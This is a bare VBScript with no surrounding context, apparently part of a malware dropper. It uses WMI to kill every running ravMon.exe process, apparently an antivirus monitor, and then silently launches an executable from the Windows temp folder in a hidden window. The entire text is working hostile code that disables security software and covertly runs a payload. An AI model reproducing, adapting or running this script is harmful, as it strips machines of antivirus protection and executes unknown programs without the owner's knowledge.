dim bag,pipe
set bag=getobject("winmgmts:\\.\root\cimv2")
set pipe=bag.execquery("select * from win32_process where name='ravMon.exe'")
for each i in pipe
i.terminate()
next
wscript.sleep 1


DIM objShell
set objShell=wscript.createObject("wscript.shell")
iReturn=objShell.Run("cmd.exe /C  %systemroot%\temp\tonghua.exe", 0, TRUE)